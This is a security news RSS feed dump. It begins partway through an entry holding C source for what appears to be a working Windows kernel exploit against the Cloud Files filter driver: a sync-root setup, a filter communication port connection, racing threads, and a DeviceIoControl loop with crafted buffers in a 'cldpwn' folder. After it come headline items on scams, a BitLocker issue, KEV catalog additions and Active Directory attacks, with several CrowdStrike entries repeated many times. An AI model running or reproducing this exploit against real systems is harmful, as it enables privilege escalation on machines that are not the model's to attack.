+  policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
+  policies.InSync = CF_INSYNC_POLICY_NONE;
+  policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
+  HRESULT hr = CfRegisterSyncRoot(dir, & reg, & policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
+  if (FAILED(hr)) {
+    printf("CfRegisterSyncRoot failed with %p\n", hr);
+    return 1;
+  }
+
+  dev = CreateFileA("C:\\ProgramData\\cldpwn\\12344.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
+  if (dev == INVALID_HANDLE_VALUE) {
+    printf("Failed!%d\n", GetLastError());
+
+    system("pause");
+  }
+
+  HANDLE dir_handle = CreateFileA("C:\\ProgramData\\cldpwn", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+  DWORD BytesReturned;
+  char inbuffer[0x100] = {
+    0
+  };
+  *(int * ) inbuffer = 0x9000001A;
+  *(int * )(inbuffer + 4) = 0xC0000007;
+  char outbuffer[0x1000] = {
+    0
+  };
+  DeviceIoControl(dir_handle, 0x903BC, inbuffer, 0x98, outbuffer, 0x1000, & BytesReturned, 0);
+  fileid = * (INT64 * ) outbuffer;
+
+  char buffer[0x200];
+  DWORD * buffer1 = (DWORD * ) buffer;
+  memset(buffer, 0, 0x200);
+  char out[0x200] = {
+    0
+  };
+  DWORD re;
+  char context[0x200] = {
+    0
+  };
+  *(DWORD * )(context) = 0x63706C43;
+  *(DWORD * )(context + 4) = 0x1;
+  int hResult = FilterConnectCommunicationPort(L "\\CLDMSGPORT",
+    0,
+    context,
+    16,
+    NULL, &
+    port);
+  hResult = FilterConnectCommunicationPort(L "\\CLDMSGPORT",
+    0,
+    context,
+    16,
+    NULL, &
+    port1);
+
+  /*
+  CF_CALLBACK_REGISTRATION* table = new CF_CALLBACK_REGISTRATION[3];
+
+
+  table[0].Callback = (CF_CALLBACK)ACK_RENAME;
+  table[0].Type = CF_CALLBACK_TYPE_NOTIFY_RENAME;//io callback CF_CALLBACK_TYPE_FETCH_DATA
+  table[1].Callback = (CF_CALLBACK)ACK_RENAME;
+  table[1].Type = CF_CALLBACK_TYPE_NOTIFY_FILE_OPEN_COMPLETION;//io callback CF_CALLBACK_TYPE_FETCH_DATA
+  //末尾结束
+  table[2].Callback = NULL;
+  table[2].Type = CF_CALLBACK_TYPE_NONE;
+
+  CF_CONNECTION_KEY key = { 0 };
+  PVOID ptr = NULL;
+  INT hresult = CfConnectSyncRoot(dir, table, ptr, CF_CONNECT_FLAG_NONE, &key);
+  */
+  poc2(port);
+
+  wchar_t path[] = L "boo16.txt";
+
+  createthread test = (createthread) GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
+
+  HANDLE a;
+  char buffer11[0x100];
+  *(WORD * )(tmp + 0x8) = 0x100;
+  *(WORD * )(tmp + 0xa) = (lstrlenW(path)) * 2;
+  *(WORD * )(tmp + 0xc) = 0x20;
+  *(WORD * )(tmp + 0xe) = 0x30;
+  memcpy(tmp + 0x100, path, (lstrlenW(path) + 1) * 2);
+  test(GetCurrentProcess(), NULL, FALSE, NULL, 0, 0,
+    thread1, NULL, & a, (PDWORD) buffer11);
+  test(GetCurrentProcess(), NULL, FALSE, NULL, 0, 0,
+    thread2, NULL, & a, (PDWORD) buffer11);
+
+  *(int * ) inbuffer = 0x9000001A;
+  *(int * )(inbuffer + 4) = 0xC0000001;
+  *(int * )(inbuffer + 8) = 0x1;
+  *(int * )(inbuffer + 16) = 0x200;
+  *(char ** )(inbuffer + 24) = tmp;
+  while (1) {
+
+    *(char * )(tmp + 0x106) = 0x31;
+    *(char * )(tmp + 0x11a) = 0x31;
+    DeviceIoControl(dir_handle, 0x903BC, inbuffer, 0x98, outbuffer, 0x1000, & BytesReturned, 0);
+  }
+
+  Sleep(0x10000000);
+  return 0;
+}]]></content:encoded></item><item><title>Sharing is scaring: The WhatsApp screen-sharing scam you didn’t see coming</title><link>https://www.welivesecurity.com/en/scams/sharing-is-scaring-whatsapp-screen-sharing-scam/</link><author></author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[How a fast-growing scam is tricking WhatsApp users into revealing their most sensitive financial and other data]]></content:encoded></item><item><title>Microsoft: October Windows updates trigger BitLocker recovery</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-october-windows-updates-trigger-bitlocker-recovery/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 5 Nov 2025 08:56:22 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft has warned that some systems may boot into BitLocker recovery after installing the October 2025 Windows security updates. [...]]]></content:encoded></item><item><title>CISA Adds Gladinet and CWP Flaws to KEV Catalog Amid Active Exploitation Evidence</title><link>https://thehackernews.com/2025/11/cisa-adds-gladinet-and-cwp-flaws-to-kev.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDITEgki_ICpEMcN92xGckaqijjlvW9kC6ZtYS8v1Fmvc50kvsku_Wke0Zk6nK6a27I8kbBHK8GSnlQ8xyGQx0_2WEMTfW4NN9Y5-ANCcPI5lTs7TdQwbaDygSw6KUqCaLW_JBEH1hKyvtVKjyqUs0Uk6xzrCIEW0nVuKt1VHtYv2SqCrHBJDznZQrP84J/s1600/CISA.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 06:12:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added two security flaws impacting Gladinet and Control Web Panel (CWP) to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation in the wild.
 The vulnerabilities in question are listed below -
 
 CVE-2025-11371 (CVSS score: 7.5) - A vulnerability in files or directories accessible to]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-leads-new-evolution-of-security-automation-with-charlotte-agentic-soar/</link><author>Paola Miranda</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon for XIoT Innovations Improve Speed and Visibility in OT Networks</title><link>https://www.crowdstrike.com/en-us/blog/falcon-for-xiot-improves-speed-and-visibility-in-ot-networks/</link><author>Dana Larson</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Expands Agentic Security Workforce with New Agents</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-expands-agentic-security-workforce-with-new-agents/</link><author>Lucia Stanham</author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ISC Stormcast For Wednesday, November 5th, 2025 https://isc.sans.edu/podcastdetail/9686, (Wed, Nov 5th)</title><link>https://isc.sans.edu/diary/rss/32450</link><author></author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 02:00:03 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Know Ourselves Before Knowing Our Enemies: Threat Intelligence at the Expense of Asset Management</title><link>https://unit42.paloaltonetworks.com/asset-management/</link><author>Bradley Duncan</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/11/06_Opinion_Category_1505x922-1.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 00:00:02 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[Effective cyber defense starts with knowing your own network. Unit 42 explains why asset management is the foundation of threat intelligence.]]></content:encoded></item><item><title>Site Unseen: Enumerating and Attacking Active Directory Sites</title><link>https://www.synacktiv.com/en/publications/site-unseen-enumerating-and-attacking-active-directory-sites</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Tue, 4 Nov 2025 23:59:48 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# Site Unseen: Enumerating and Attacking Active Directory Sites
